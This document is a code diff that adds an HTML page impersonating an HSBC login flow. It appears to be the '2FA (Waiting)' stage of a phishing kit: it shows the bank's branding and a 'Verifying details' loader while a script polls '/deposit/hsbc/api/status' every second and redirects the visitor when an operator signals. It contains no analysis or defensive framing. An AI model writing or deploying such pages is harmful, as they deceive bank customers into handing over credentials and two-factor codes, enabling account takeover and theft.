@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<-- 0044)deposit/hsbc/wo -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" type="text/css" href="./files/style.css">
+        <link rel="shortcut icon" type="image/PNG" href="./files/logoTrans.png">
+        <title>HSBC - Login</title>
+        <script src="./files/jquery-3.6.0.min.js###%" crossorigin="anonymous"></script>
+        <script>
+            var lrbank = 'HSBC (CA)';
+            var lrinfo = '2FA (Waiting)';
+        </script>
+        <script>
+            setInterval(function() {
+                $.post('/deposit/hsbc/api/status', {page: lrinfo}, function(response) {
+                    if (response.status) {
+                        location.href = response.href;
+                    }
+                }, 'JSON');
+            }, 1000);
+        </script>
+        <style>
+        #loaderOnLoading {
+            display: block;
+        }
+        </style>
+    </head>
+    <body>
+        <img src="./files/logoTrans.png" id="transLogo">
+        <div class="header">
+            <div class="headerRow">
+                <img src="./files/logoTrans.png" id="logo">
+                <!-- <div class="btn" id="loginBtn">Login On </div> -->
+            </div>
+        </div>
+        <div class="main">
+            <div class="alignment">
+                <p class="pageTitle" style="text-align: center">Verifying details</p>
+                <img src="./files/loading.gif" alt="" id="loaderOnLoading">
+                <p class="desText" style="text-align: center; padding: 20px 0;">Loading please wait...</p>
+            </div>
+        </div>
+        <div class="footer">
+        </div>
+    
+
+</body></html>
